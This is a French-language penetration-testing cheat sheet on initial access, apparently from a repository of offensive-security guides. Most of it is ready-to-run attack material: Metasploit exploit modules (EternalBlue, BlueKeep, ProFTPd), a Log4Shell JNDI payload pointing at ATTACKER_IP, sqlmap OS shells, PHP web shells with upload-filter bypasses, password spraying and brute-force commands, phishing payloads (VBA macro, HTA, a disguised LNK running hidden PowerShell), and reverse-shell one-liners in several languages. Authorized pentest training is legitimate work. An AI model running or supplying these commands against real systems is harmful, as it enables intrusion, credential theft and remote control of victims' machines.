# 🚪 Phase 1: Accès initial

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Objectif :** Obtenir un premier accès au réseau ou au système cible.

> **Précision :** plusieurs exemples utilisent des scripts externes, des outils ou des vulnérabilités historiques. Les noms de scripts et les variantes d’extension ne garantissent ni leur disponibilité dans votre installation ni le contournement d’un filtre moderne. `IEX(payload)` et `BASE64_PAYLOAD` sont des espaces réservés à adapter, pas des exemples complets prêts à l’emploi.

---

## 🎯 Vecteurs d’attaque

| Vecteur | Description |
|--------|-------------|
| **Exploitation d’une application exposée sur Internet** | Vulnérabilités d’applications web, d’API et de CMS |
| **Phishing (hameçonnage)** | Courriels malveillants contenant des charges utiles (payloads) |
| **Identifiants valides** | Password spraying (essai d’un mot de passe sur plusieurs comptes), credential stuffing (réutilisation d’identifiants divulgués) |
| **Services externes** | Services RDP, SSH, VPN ou FTP exposés |
| **Chaîne d’approvisionnement** | Compromission d’un logiciel de confiance |

---

## 💻 Exploitation de vulnérabilités connues

### Recherche d’exploits
```bash
# SearchSploit — base locale d’exploits
searchsploit apache 2.4
searchsploit -m 41234  # Copier l’exploit dans le répertoire courant
searchsploit --nmap scan.xml  # Analyser les résultats Nmap

# Recherche dans Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Exploits courants

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Vérifier si la cible est vulnérable
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Exploiter avec Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Tester la présence de la vulnérabilité
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Configurer le serveur d’exploitation
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Rechercher ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Utiliser l’exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Attaques contre les applications web

### Injection SQL (obtenir un shell)
```bash
# Tester une injection SQL
sqlmap -u "http://target.com/page?id=1" --batch

# Obtenir un shell système par injection SQL
sqlmap -u "http://target.com/page?id=1" --os-shell

# Obtenir un shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Obtenir un shell par téléversement de fichier
```bash
# Créer un shell inversé (reverse shell) PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Ou un shell PHP simple
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Contourner les filtres d’extension
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Exécution de code à distance (RCE)
```bash
# Tester une exécution de code à distance
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Shell inversé par exécution de code à distance
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Attaques sur les identifiants

### Password spraying (pulvérisation de mots de passe)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential stuffing (réutilisation d’identifiants divulgués)
```bash
# Utiliser des identifiants divulgués connus
hydra -C creds.txt ftp://192.168.1.10

# Format de creds.txt :
# username:password
```

### Identifiants par défaut
```bash
# Identifiants par défaut courants à essayer :
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec avec des identifiants courants
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Charges utiles de phishing (hameçonnage)

### Charge utile dans une macro Office
```bash
# Générer une charge utile de macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Ou utiliser msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Charge utile HTA
```bash
# Générer un fichier HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# L’héberger
python3 -m http.server 80
```

### Charge utile LNK
```powershell
# Créer un raccourci malveillant
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Exploitation de services externes

### Exploitation de RDP
```bash
# Attaque par force brute sur RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Exploitation de SSH
```bash
# Attaque par force brute sur SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH avec des identifiants connus
ssh user@192.168.1.10

# SSH avec une clé privée
ssh -i id_rsa user@192.168.1.10
```

### Exploitation de FTP
```bash
# Connexion anonyme
ftp 192.168.1.10
# Nom d’utilisateur : anonymous
# Mot de passe : anonymous

# Attaque par force brute
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Exploit ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Mise en place des programmes d’écoute (listeners)

### Écoute avec Netcat
```bash
nc -lvnp 4444
```

### Gestionnaire de connexion Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# Sur la machine d’attaque
powercat -l -p 4444

# Sur la machine cible
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Aide-mémoire

### Shells inversés en une ligne

| Système | Commande |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Fiches associées

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Vulnérabilités web](../../SSRF/README.md)

---

**Phase suivante :** [02 - Énumération/découverte →](./02-Enumeration.fr.md)
